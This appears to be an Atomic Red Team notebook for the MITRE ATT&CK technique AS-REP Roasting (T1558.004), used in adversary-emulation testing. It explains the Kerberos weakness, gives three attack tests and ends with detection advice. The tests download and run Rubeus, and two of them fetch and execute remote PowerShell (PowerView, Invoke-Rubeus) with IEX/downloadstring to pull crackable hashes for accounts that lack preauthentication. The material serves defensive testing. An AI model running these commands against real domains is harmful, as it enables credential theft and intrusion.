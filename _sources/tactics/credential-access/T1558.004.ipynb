{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "496430f9",
   "metadata": {},
   "source": "# T1558.004 - AS-REP Roasting\nAdversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)"
  },
  {
   "cell_type": "markdown",
   "id": "922e9e44",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "bd7cf73e",
   "metadata": {},
   "source": "### Atomic Test #1 - Rubeus asreproast\nInformation on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must be domain joined\n\n##### Check Prereq Commands:\n```powershell\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host Joining this computer to a domain must be done manually\n\n```\n##### Description: Rubeus must exist\n\n##### Check Prereq Commands:\n```powershell\nif(Test-Path -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe -OutFile PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59f622ca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.004 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6d934829",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncmd.exe /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asreproast /outfile:\"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6cba03db",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "34bca02f",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7014b20a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.004 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9df326a7",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Get-DomainUser with PowerView",
    "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fd1d27fd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "5edbab40",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - WinPwn - PowerSharpPack - Kerberoasting Using Rubeus",
    "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "43864ad4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1558.004 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "f735b6b0",
   "metadata": {},
   "source": "## Detection\nEnable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4768 and 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17], pre-authentication not required [Type: 0x0]).(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: Microsoft 4768 TGT 2017)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}